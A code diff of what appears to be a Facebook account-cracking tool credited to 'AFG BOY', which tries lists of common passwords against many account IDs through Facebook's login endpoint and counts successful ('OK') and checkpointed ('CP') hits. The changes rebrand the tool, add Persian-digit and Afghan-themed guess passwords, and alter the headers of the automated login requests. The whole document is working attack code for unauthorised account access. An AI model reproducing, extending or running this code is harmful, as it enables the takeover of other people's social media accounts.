@@ -164,7 +164,7 @@ logo=("""\033[1;91m
          \033[1;97m   888     888  T88b     888     
           \033[1;97m  888     888   T88b    888\033[1;32m       XD
 \033[1;37m--------------------------------------------------
-[☆] Author   : AFG BOY
+[☆] Author   : AFG BOY 001
 [☆] Facebook : Mujeebullah Amini
 [☆] Tool     : Free
 [☆] Version  : 1.0
@@ -287,7 +287,7 @@ def menu():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python trt.py')
+				os.system('python AFG.py')
 			elif xd in ['2','02']:
 				pak()
 			elif xd in ['3','03']:
@@ -347,7 +347,7 @@ def pak():
 				elif pcs in ['7','07']:
 					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
 				elif pcs in ['8','08']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
+					passlist = [psx,ids,'afghan','afghan12345','afghan123','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
 				if mthd in ['1','01']:
 					TRT.submit(trt1,ids,passlist)
 				if mthd in ['2','02']:
@@ -454,7 +454,7 @@ def gmail():
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [AFG-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -1302,15 +1302,11 @@ def trt3(ids,passlist):
                                 'fb_api_req_friendly_name':'authenticate',
                         }
                         headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+}
+                        url =  'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
